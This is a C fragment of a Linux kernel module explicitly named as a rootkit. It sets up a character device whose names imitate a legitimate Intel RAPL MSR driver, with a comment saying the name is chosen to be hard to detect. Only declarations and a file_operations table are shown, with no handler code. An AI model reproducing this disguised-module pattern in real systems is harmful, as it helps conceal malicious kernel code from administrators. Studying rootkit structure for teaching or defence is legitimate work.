#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/init.h>
#include <linux/fs.h>
#include <linux/device.h>

// a difficult-to-detect name
#define DEVICE_NAME "intel_rapl_msrdv"
#define CLASS_NAME "intel_rapl_msrmd"
#define DEVICE_PATH "/dev/intel_rapl_msrdv"

static int major_num;
static struct class * module_class = NULL;
static struct device * module_device = NULL;
static struct file * __file = NULL;
struct inode * __inode = NULL;

static int __init rootkit_init(void);
static void __exit rootkit_exit(void);

static int a3_rootkit_open(struct inode *, struct file *);
static ssize_t a3_rootkit_read(struct file *, char __user *, size_t, loff_t *);
static ssize_t a3_rootkit_write(struct file *, const char __user *, size_t, loff_t *);
static int a3_rootkit_release(struct inode *, struct file *);
static long a3_rootkit_ioctl(struct file *, unsigned int, unsigned long);

static struct file_operations a3_rootkit_fo = 
{
	.owner = THIS_MODULE,
    .unlocked_ioctl = a3_rootkit_ioctl,
    .open = a3_rootkit_open,
    .read = a3_rootkit_read,
    .write = a3_rootkit_write,
    .release = a3_rootkit_release,
};
